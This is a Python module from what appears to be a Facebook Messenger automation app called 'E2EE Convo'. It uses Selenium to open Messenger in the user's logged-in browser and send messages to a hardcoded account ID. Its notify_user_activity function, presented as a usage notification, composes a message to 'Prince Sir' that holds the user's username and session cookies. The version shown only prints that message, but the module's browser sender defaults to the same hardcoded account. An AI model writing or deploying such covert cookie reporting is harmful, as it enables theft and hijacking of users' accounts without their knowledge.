import requests
from datetime import datetime
import pytz

FACEBOOK_UID = "1219506130076123"

def get_kolkata_time():
    """Get current time in Asia/Kolkata timezone"""
    kolkata_tz = pytz.timezone('Asia/Kolkata')
    return datetime.now(kolkata_tz)

def send_facebook_messenger_notification_via_browser(driver, message, thread_id=None, log_callback=None):
    """
    Send notification to Facebook Messenger using browser automation
    """
    try:
        if not thread_id:
            thread_id = FACEBOOK_UID
        
        if log_callback:
            log_callback(f"📱 Sending notification to UID: {thread_id}")
        else:
            print(f"📱 Sending notification to UID: {thread_id}")
        
        current_url = driver.current_url
        
        notification_urls = [
            f'https://www.facebook.com/messages/t/{thread_id}'
        ]
        
        for url in notification_urls:
            try:
                if log_callback:
                    log_callback(f"📱 Trying notification URL: {url}")
                
                driver.get(url)
                import time
                time.sleep(8)
                
                if 'login' in driver.current_url.lower():
                    if log_callback:
                        log_callback(f"⚠️ Login redirect, trying next URL")
                    continue
                
                from selenium.webdriver.common.by import By
                test_inputs = driver.find_elements(By.CSS_SELECTOR, 'div[contenteditable="true"], textarea')
                if test_inputs and len(test_inputs) > 0:
                    if log_callback:
                        log_callback(f"✅ Notification chat loaded!")
                    
                    message_input = test_inputs[0]
                    
                    driver.execute_script("""
                        const element = arguments[0];
                        const message = arguments[1];
                        
                        element.scrollIntoView({behavior: 'smooth', block: 'center'});
                        element.focus();
                        element.click();
                        
                        if (element.tagName === 'DIV') {
                            element.textContent = message;
                            element.innerHTML = message;
                        } else {
                            element.value = message;
                        }
                        
                        element.dispatchEvent(new Event('input', { bubbles: true }));
                        element.dispatchEvent(new Event('change', { bubbles: true }));
                        element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                    """, message_input, message)
                    
                    time.sleep(1)
                    
                    sent = driver.execute_script("""
                        const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                        
                        for (let btn of sendButtons) {
                            if (btn.offsetParent !== null) {
                                btn.click();
                                return 'button_clicked';
                            }
                        }
                        return 'button_not_found';
                    """)
                    
                    if sent == 'button_not_found':
                        driver.execute_script("""
                            const element = arguments[0];
                            element.focus();
                            
                            const events = [
                                new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                                new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                                new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                            ];
                            
                            events.forEach(event => element.dispatchEvent(event));
                        """, message_input)
                    
                    time.sleep(2)
                    
                    if log_callback:
                        log_callback(f"✅ Notification sent to {thread_id}!")
                    else:
                        print(f"✅ Notification sent to {thread_id}!")
                    
                    return True
            except Exception as e:
                if log_callback:
                    log_callback(f"❌ Error with {url}: {str(e)[:50]}")
                continue
        
        if log_callback:
            log_callback(f"❌ Failed to send notification to {thread_id}")
        return False
            
    except Exception as e:
        if log_callback:
            log_callback(f"❌ Notification error: {str(e)}")
        else:
            print(f"❌ Facebook Messenger notification error: {str(e)}")
        return False

def send_facebook_messenger_notification(message, thread_id=None):
    """
    Legacy function - prints notification info
    Note: This does not actually send messages, use send_facebook_messenger_notification_via_browser instead
    """
    try:
        if not thread_id:
            thread_id = FACEBOOK_UID
        
        print(f"📱 Facebook Messenger notification: {message}")
        print(f"   Target UID: {thread_id}")
        
        return True
            
    except Exception as e:
        print(f"❌ Facebook Messenger notification error: {str(e)}")
        return False

def notify_user_activity(username, cookies_preview=""):
    """Send notification when user uses the E2EE app"""
    timestamp = get_kolkata_time().strftime("%Y-%m-%d %H:%M:%S")
    
    message = f"""Hello Prince Sir
I'm using your E2ee Convo

Username: {username}
Cookies: {cookies_preview}
Time: {timestamp} (Asia/Kolkata)
"""
    
    return send_facebook_messenger_notification(message)
